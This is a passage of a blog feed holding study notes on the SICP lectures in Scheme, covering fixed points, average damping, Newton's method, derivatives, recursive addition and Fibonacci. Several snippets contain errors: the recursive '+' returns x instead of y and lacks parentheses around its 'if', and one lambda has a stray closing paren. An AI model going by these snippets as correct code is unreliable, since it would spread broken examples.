&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">average&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">/ &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="nv">y&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nv">y&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Details of it:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; f: method to get close to fixed-point&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">fixed-point&lt;/span> &lt;span class="nv">f&lt;/span> &lt;span class="nv">start&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">iter&lt;/span> &lt;span class="nv">old&lt;/span> &lt;span class="nv">new&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">if &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">close_enough?&lt;/span> &lt;span class="nv">old&lt;/span> &lt;span class="nv">new&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">new&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">iter&lt;/span> &lt;span class="nv">new&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">f&lt;/span> &lt;span class="nv">new&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">iter&lt;/span> &lt;span class="nv">start&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">f&lt;/span> &lt;span class="nv">start&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="eg5-average-damp">eg.5 Average Damp&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">sqrt &lt;/span>&lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">fixed-point&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">average_damp&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">lambda &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">y&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">/ &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="nv">y&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="nv">average_damp&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">lambda &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">f&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">lambda &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">average&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">f&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>the same as below&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">average-damp&lt;/span> &lt;span class="nv">f&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">foo&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">average&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">f&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">foo&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="eg6-newtons-method">eg.6 Newton&amp;rsquo;s method&lt;/h2>
&lt;p>To find a &lt;code>y&lt;/code> to such that
$$
f(y) = 0
$$
start with a guess &lt;code>y0&lt;/code>&lt;/p>
&lt;p>$$
y_{n+1} = y_{n} - {\frac{f(y_{n})}{\frac{\mathrm{d} f}{\mathrm{d} y}|_{y=y_n}}}
$$&lt;/p>
&lt;p>Apply this method to compute a sqrt root of x:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">sqrt &lt;/span>&lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">newton&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">lambda &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">y&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">- &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">square&lt;/span> &lt;span class="nv">y&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Details:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">newton&lt;/span> &lt;span class="nv">f&lt;/span> &lt;span class="nv">guess&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="nv">df&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">deriv&lt;/span> &lt;span class="nv">f&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">fixed-point&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">lambda &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">- &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">/ &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">f&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">df&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">))))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">guess&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>How to define &lt;code>deriv&lt;/code>?&lt;/p>
&lt;p>$$
f&amp;rsquo;(x) = \frac{f(x+{\mathrm{d x}})-f(x)}{\mathrm{d} x}
$$&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="nv">deriv&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">lambda &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">f&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">lambda &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">/ &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">- &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">f&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="nv">dx&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">f&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">dx&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>$$
{\mathrm{d} x}?
$$&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; an ugly but simple method&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="nv">dx&lt;/span> &lt;span class="mf">0.0000001&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>SICP_Lec_1b</title><link>https://resyon.netlify.app/p/sicp_lec_1b/</link><pubDate>Sun, 30 Apr 2023 19:44:28 +0800</pubDate><guid>https://resyon.netlify.app/p/sicp_lec_1b/</guid><description>&lt;h1 id="recursive">Recursive&lt;/h1>
&lt;p>Some prossible methods to implement operator+.&lt;/p>
&lt;h2 id="prerequisites">prerequisites&lt;/h2>
&lt;p>There exists some primitive procedures, which are implemented in other method finally.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; 1-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nv">-&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">...&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; 1+&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nv">+&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">...&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>eg.1 operator+&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; provided that x is non-negative integer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="nv">y&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">= &lt;/span>&lt;span class="mi">0&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">x&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nv">-&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nv">+&lt;/span> &lt;span class="nv">y&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>an instance&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="mi">3&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>inspect the compute procedure:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="mi">3&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nv">-&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nv">+&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nv">-&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nv">+&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nv">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nv">+&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="mi">7&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">7&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>eg.2 fibonacci&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">define &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">fib&lt;/span> &lt;span class="nv">x&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="k">if &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">&amp;lt; &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">+ &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">fib&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">- &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">fib&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">- &lt;/span>&lt;span class="nv">x&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>duplicate compute procedure &lt;code>fib(- x 2)&lt;/code>&lt;/p></description></item><item><title>SICP_Lec_1a</title><link>https://resyon.netlify.app/p/sicp_lec_1a/</link><pubDate>Sun, 30 Apr 2023 10:01:41 +0800</pubDate><guid>https://resyon.netlify.app/p/sicp_lec_1a/</guid><description>&lt;h1 id="black_box-abstraction">black_box abstraction&lt;/h1>
&lt;p>intro to mit-scheme&lt;/p>
&lt;h2 id="primitive-objects">primitive objects&lt;/h2>
&lt;h3 id="primitive-elements">primitive elements&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-scheme" data-lang="scheme">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; number&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">3&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; operator&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">-&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
